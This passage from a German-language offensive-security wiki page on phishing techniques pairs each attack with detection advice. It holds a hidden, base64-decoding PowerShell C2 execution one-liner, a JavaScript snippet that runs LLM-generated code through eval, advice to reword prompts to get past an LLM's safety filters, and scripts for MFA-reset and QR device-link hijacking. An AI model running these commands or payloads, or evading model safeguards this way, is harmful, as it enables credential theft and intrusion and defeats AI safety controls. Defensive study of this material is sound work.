* `Invoke-WebRequest` legt den Payload in `%TEMP%` ab, eine kurze Pause verschleiert Netzwerklatenzen, anschließend ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL sendet die Host-Identität an den C2 und fragt diesen alle paar Minuten ab. Remote-Aufgaben werden als **base64-kodiertes PowerShell** übertragen und versteckt sowie mit Richtlinienumgehung ausgeführt:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Dadurch bleibt die C2-Flexibilität erhalten (der Server kann Aufgaben austauschen, ohne die DLL zu aktualisieren), und Konsolenfenster werden verborgen. Suchen Sie nach PowerShell-Kindprozessen von `rundll32.exe`, die gemeinsam `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` verwenden.
* Defender können auf HTTP(S)-Callbacks der Form `...page.php?tynor=<COMPUTER>sss<USER>` sowie auf Abfrageintervalle von 5 Minuten nach dem Laden der DLL achten.

---

## KI-gestützte Phishing-Operationen
Angreifer kombinieren inzwischen **LLM- und Voice-Cloning-APIs** für vollständig personalisierte Köder und Interaktionen in Echtzeit.

| Ebene | Beispielhafte Nutzung durch den Bedrohungsakteur |
|-------|---------------------------------------------|
|Automatisierung|Mehr als 100.000 E-Mails / SMS mit variierenden Formulierungen und Tracking-Links generieren und versenden.|
|Generative KI|*Einmalige* E-Mails erstellen, die auf öffentliche M&A-Aktivitäten und Insiderwitze aus sozialen Medien Bezug nehmen; Deepfake-Stimme eines CEOs bei einem Rückrufbetrug.|
|Agentische KI|Eigenständig Domains registrieren, Open-Source-Informationen sammeln und E-Mails der nächsten Stufe erstellen, wenn ein Opfer klickt, aber keine Zugangsdaten übermittelt.|

**Abwehr:**
• **Dynamische Banner** hinzufügen, die Nachrichten aus nicht vertrauenswürdiger Automatisierung hervorheben (über ARC-/DKIM-Anomalien).
• **Stimmbiometrische Herausforderungsphrasen** für risikoreiche telefonische Anfragen einsetzen.
• In Awareness-Programmen kontinuierlich KI-generierte Köder simulieren – statische Vorlagen sind veraltet.

Siehe auch – Missbrauch agentischer Browser für Credential-Phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – Missbrauch lokaler CLI-Tools und MCP durch KI-Agenten (für Geheimnisinventarisierung und Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-gestützte Laufzeitassemblierung von Phishing-JavaScript (Codegenerierung im Browser)

Angreifer können harmlos wirkendes HTML ausliefern und den Stealer **zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** nach JavaScript fragen und dieses anschließend im Browser ausführen (z. B. über `eval` oder ein dynamisches `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt als Verschleierung:** Exfiltrations-URLs/Base64-Zeichenfolgen im Prompt kodieren; die Formulierung iterativ anpassen, um Sicherheitsfilter zu umgehen und Halluzinationen zu reduzieren.
2. **Clientseitiger API-Aufruf:** Beim Laden ruft JavaScript ein öffentliches LLM (Gemini/DeepSeek usw.) oder einen CDN-Proxy auf; im statischen HTML sind nur der Prompt/API-Aufruf enthalten.
3. **Zusammenbauen und ausführen:** Die Antwort verketten und ausführen (polymorph pro Besuch):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** Generierter Code personalisiert den Köder (z. B. LogoKit token parsing) und sendet Zugangsdaten an den im Prompt verborgenen Endpoint.

**Umgehungsmerkmale**
- Der Datenverkehr läuft über bekannte LLM-Domains oder seriöse CDN-Proxies, manchmal über WebSockets zu einem Backend.
- Kein statischer Payload; bösartiges JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen pro Session einzigartige **Stealer**.

**Erkennungsideen**
- Sandboxes mit aktiviertem JS ausführen; **zur Laufzeit ausgeführtes `eval`/dynamische Skripterstellung aus LLM-Antworten** markieren.
- Nach Frontend-POSTs an LLM-APIs suchen, auf die unmittelbar `eval`/`Function` mit dem zurückgegebenen Text folgt.
- Bei nicht autorisierten LLM-Domains im Client-Datenverkehr und anschließenden Credential-POSTs alarmieren.

---

## MFA Fatigue / Push Bombing Variant – Erzwungener Reset
Neben klassischem Push Bombing erzwingen Angreifer während des Helpdesk-Anrufs einfach eine **neue MFA-Registrierung** und machen dadurch das vorhandene Token des Benutzers ungültig. Jede nachfolgende Login-Aufforderung erscheint dem Opfer legitim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Überwache AzureAD-/AWS-/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** innerhalb weniger Minuten von derselben IP aus auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können bösartige Befehle heimlich aus einer kompromittierten oder typosquatteten Webseite in die Zwischenablage des Opfers kopieren und den Benutzer anschließend dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen. Dadurch wird beliebiger Code ohne Download oder Anhang ausgeführt.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Verteilung bösartiger Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijacking der WhatsApp-Geräteverknüpfung durch QR Social Engineering
* Eine Köderseite (z. B. ein gefälschter „Kanal“ eines Ministeriums/CERTs) zeigt einen WhatsApp-Web/Desktop-QR-Code an und weist das Opfer an, ihn zu scannen, wodurch der Angreifer heimlich als **verknüpftes Gerät** hinzugefügt wird.<sup>[[12]](#references)</sup>
* Der Angreifer erhält sofort Einblick in Chats und Kontakte, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine Benachrichtigung über ein „neues verknüpftes Gerät“. Verteidiger können nach unerwarteten Geräteverknüpfungsereignissen suchen, die kurz nach Besuchen nicht vertrauenswürdiger QR-Seiten auftreten.

### Mobile-gesteuertes Phishing zur Umgehung von Crawlern/Sandboxes
Betreiber schalten ihre Phishing-Abläufe zunehmend hinter eine einfache Geräteprüfung, sodass Desktop-Crawler die finalen Seiten nie erreichen. Ein gängiges Muster ist ein kleines Script, das prüft, ob das DOM Touch-Eingaben unterstützt, und das Ergebnis an einen Server-Endpunkt sendet. Nicht mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Benutzern der vollständige Ablauf angezeigt wird.<sup>[[7]](#references)</sup>

Minimales Client-Snippet (typische Logik):
```html
<script src="/static/detect_device.js"></script>
```
Logik von `detect_device.js` (vereinfacht):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Häufig beobachtetes Serververhalten:
- Setzt beim ersten Laden ein session cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs `500` (oder einen Platzhalter) zurück, wenn `is_mobile=false`; stellt phishing nur bereit, wenn `true`.

Heuristiken für Hunting und Detection:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Abfolge von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 für nicht-mobile Clients; legitime Pfade für mobile Opfer geben 200 mit nachfolgendem HTML/JS zurück.
- Seiten blockieren oder genau prüfen, deren Inhalt ausschließlich von `ontouchstart` oder ähnlichen Geräteprüfungen abhängig ist.

Tipps zur Abwehr:
- Crawler mit mobilen Fingerabdrücken und aktiviertem JS ausführen, um gated content sichtbar zu machen.
- Bei neu registrierten Domains auf verdächtige 500-Antworten nach `POST /detect` alarmieren.

## References

- [1] [Generierung von Domain-Varianten für phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [phishing finden: Tools und Techniken (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Zugangsdaten stehlen und 2FA mit noVNC umgehen (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Sitzungen stehlen und 2FA mit EvilnoVNC umgehen (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [DKIM mit Postfix unter Debian Wheezy installieren und konfigurieren (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globaler Incident-Response-Bericht 2025 von Unit 42 – Ausgabe Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing-Infrastruktur und Heuristiken (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die nächste Grenze von Runtime-Assembly-Angriffen: Nutzung von LLMs zur Generierung von phishing-JavaScript in Echtzeit](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking und TDS: Einblick in ein Ökosystem zur Malware-Verteilung](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting von Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Datenverkehr zu Microsofts windows.com mit Bitflipping kapern (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liebe? Eigentlich: Gefälschte Dating-App als Köder in gezielter Spyware-Kampagne in Pakistan eingesetzt](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs und Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
